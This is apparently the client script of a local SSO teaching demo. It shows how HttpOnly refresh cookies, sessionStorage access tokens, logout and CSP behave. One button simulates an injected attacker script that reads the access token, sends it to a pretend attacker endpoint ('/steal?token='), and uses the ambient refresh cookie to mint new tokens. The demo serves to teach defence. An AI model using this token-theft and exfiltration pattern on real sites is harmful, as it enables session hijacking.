const AUTH = {{AUTH}};  // filled in by the server, escaped with json.dumps
const MAIN = {{MAIN}};

document.getElementById("host").textContent = location.hostname + " (" + document.title + ")";
const statusEl = document.getElementById("status");
const logEl = document.getElementById("log");
const log = (...lines) => (logEl.textContent += lines.join("\n") + "\n");
const json = (x) => JSON.stringify(x, null, 2);
const decodeJwt = (t) => JSON.parse(atob(t.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));

// Ask auth.demo.localhost for an access token. The browser adds the HttpOnly
// refresh cookie by itself (credentials: "include"); this script never sees it.
async function refresh() {
  const r = await fetch(AUTH + "/refresh", { method: "POST", credentials: "include" });
  if (!r.ok) { sessionStorage.removeItem("access_token"); return null; }
  const { access_token } = await r.json();
  sessionStorage.setItem("access_token", access_token);
  return access_token;
}

document.getElementById("api").onclick = async () => {
  logEl.textContent = "";
  const token = sessionStorage.getItem("access_token");
  log(`> fetch("${AUTH}/api/me", { headers: { Authorization: "Bearer <access_token>" } })`);
  const r = await fetch(AUTH + "/api/me", { headers: { Authorization: "Bearer " + token } });
  log(`HTTP ${r.status}`, json(await r.json()));
};

// Log out: the server revokes the session and clears the refresh cookie, and this app forgets
// its access token. Other apps keep theirs (their storage is out of our reach) until they
// reload or the token expires, at most 5 minutes.
document.getElementById("logout").onclick = async () => {
  logEl.textContent = "";
  log(`> fetch("${AUTH}/logout", { method: "POST", credentials: "include" })`);
  const r = await fetch(AUTH + "/logout", { method: "POST", credentials: "include" });
  log(`HTTP ${r.status}`, '> sessionStorage.removeItem("access_token")');
  sessionStorage.removeItem("access_token");
  statusEl.textContent = r.ok ? "logged out" : "logout failed";
};

// Pretend we're an attacker's script injected into this page. What can we get?
// (A real injected <script> would already be blocked: the CSP only allows script files from this
// site. This button plays an attacker who got past that, e.g. through a compromised script file.)
document.getElementById("xss").onclick = async () => {
  logEl.textContent = "";
  document.cookie = "normal_cookie=set-by-javascript; SameSite=Strict"; // for comparison

  log("> document.cookie");
  log(json(document.cookie));
  log(document.cookie.includes("refresh_token")
    ? "  ✓ refresh token found"
    : "  ✗ no refresh_token in here (it's HttpOnly). Only the normal cookie set by JS is visible.", "");

  log('> sessionStorage.getItem("access_token")');
  const token = sessionStorage.getItem("access_token");
  log(json(token));
  if (token) log("  ✓ readable. Decoded payload:", "  " + JSON.stringify(decodeJwt(token)));
  log("");

  log(`> fetch("${MAIN}/steal?token=…", { mode: "no-cors" })   // pretend ${MAIN} is the attacker's server`);
  try {
    await fetch(MAIN + "/steal?token=" + token, { mode: "no-cors" });
    log("  ✓ sent. The token has left the page.", "");
  } catch (e) {
    log("  ✗ blocked: the page's CSP (connect-src) only allows requests to " + AUTH + ".",
        "    CSP makes exfiltration harder, not impossible (e.g. location.href = …).", "");
  }

  log(`> r = await fetch("${AUTH}/refresh", { method: "POST", credentials: "include" })`);
  const r = await fetch(AUTH + "/refresh", { method: "POST", credentials: "include" });
  log(`HTTP ${r.status} ${r.statusText}`, "");

  log("> [...r.headers]   // every response header JS can see");
  log([...r.headers].map(([k, v]) => `${k}: ${v}`).join("\n") || "(none)");
  if (r.headers.has("set-cookie")) log("  ✓ set-cookie visible", "");
  else log("  ✗ no set-cookie. /refresh does send a new refresh cookie (rotation), but",
           "    browsers never show Set-Cookie to JS. Cross-origin, JS only sees a few basic headers.", "");

  log("> await r.json()");
  const body = await r.json();
  log(json(body));
  if (body.access_token) {
    log("  ✓ a NEW access token. The browser attached the refresh cookie for us,",
        "    so we can't steal the cookie, but we can use it while we run in this page.",
        "  Decoded payload:",
        "  " + JSON.stringify(decodeJwt(body.access_token)),
        "  Different from the token in sessionStorage? " + (body.access_token !== token ? "yes" : "no"));
  } else {
    log("  ✗ no token: not logged in.");
  }
};

// On every page show: get a fresh access token with the refresh cookie (this is also what gives
// SSO across apps). "pageshow" also fires on back-button restores, so an old page re-checks too.
window.addEventListener("pageshow", async () => {
  const token = await refresh();
  statusEl.textContent = token ? "logged in as " + decodeJwt(token).sub : "logged out";
});
